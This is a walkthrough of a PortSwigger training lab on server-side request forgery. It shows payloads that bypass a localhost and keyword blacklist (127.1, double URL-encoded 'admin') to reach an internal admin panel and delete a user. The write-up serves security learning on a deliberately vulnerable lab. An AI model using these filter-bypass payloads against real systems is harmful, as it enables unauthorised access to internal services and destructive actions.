---
custom_edit_url: null
pagination_next: null
pagination_prev: null
sidebar_position: 4
---

> https://portswigger.net/web-security/ssrf/lab-ssrf-with-blacklist-filter

![[1 100.png]]

Let's check out the stock.

![[2 105.png]]

We can intercept the request using Burpsuite.

![[3 83.png]]

Let's send the request to the `Repeater`.
We can set the `stockApi` field to the following and send the request:

```
http://localhost/admin
```

![[4 70.png]]

So that request is blocked.
Let's send the following request:

```
http://127.1/
```


That returns a valid response.

Let's try visiting the `/admin` page.

```
http://127.1/admin
```

![7](https://github.com/Knign/Write-ups/assets/110326359/633f6f33-c540-4095-82c3-d85daef9a2db)

Looks like the `admin` keyword is being pattern-matched and blocked.
We can get around it by double URL encoding the string.

![10](https://github.com/Knign/Write-ups/assets/110326359/0e9aa7c9-05f8-419d-b4a2-5a5ea6c13a4e)

Let's now send the following request:

```
http://127.1/%25%36%31%25%36%34%25%36%64%25%36%39%25%36%65
```

![9](https://github.com/Knign/Write-ups/assets/110326359/099a7a29-fd61-4e3b-a3f8-55fc2fd3ecc3)

We can now delete the `carlos` user.

```
http://127.1/%25%36%31%25%36%34%25%36%64%25%36%39%25%36%65/delete?username=carlos
```

![11](https://github.com/Knign/Write-ups/assets/110326359/54f70884-0935-4b68-be82-03928025b356)

We have solved the lab.

![12](https://github.com/Knign/Write-ups/assets/110326359/88b224e6-d665-415a-85a4-1ec27f3f5fae)
